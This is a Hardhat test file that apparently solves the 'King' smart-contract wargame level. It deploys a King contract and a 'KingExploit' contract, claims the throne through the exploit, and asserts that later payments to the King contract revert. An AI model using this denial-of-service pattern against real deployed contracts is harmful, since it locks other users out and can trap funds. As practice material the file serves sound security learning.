import { expect } from "chai";
import { ethers } from "hardhat";

describe("King", function () {
  it("Should become the new king and don't let anyone overthrow me", async function () {
    const kingContract = await (
      await ethers.getContractFactory("King")
    ).deploy({ value: ethers.utils.parseEther("0.001") });
    await kingContract.deployed();

    console.log('contract deployed at:'+ kingContract.address);
    console.log("king: " + await kingContract._king());
    console.log("owner: " + await kingContract.owner());

    const [ deployer, s1 ] = await ethers.getSigners();

    // if i send eth
    // await s1.sendTransaction({
    //   to: kingContract.address,
    //   value: ethers.utils.parseEther("1"),
    // })

    const exploitContract = await (
      await ethers.getContractFactory("KingExploit")
    ).deploy();
    await exploitContract.deployed();

    console.log('contract deployed at:'+ exploitContract.address);
    await exploitContract.connect(s1).becomeKing(
      kingContract.address,
      {
        value: ethers.utils.parseEther("1")
      });
    console.log("king: " + await kingContract._king());

    // check

    await expect(
      deployer.sendTransaction({
        to: kingContract.address,
        value: 1
      })
    ).to.be.reverted;


  });
});
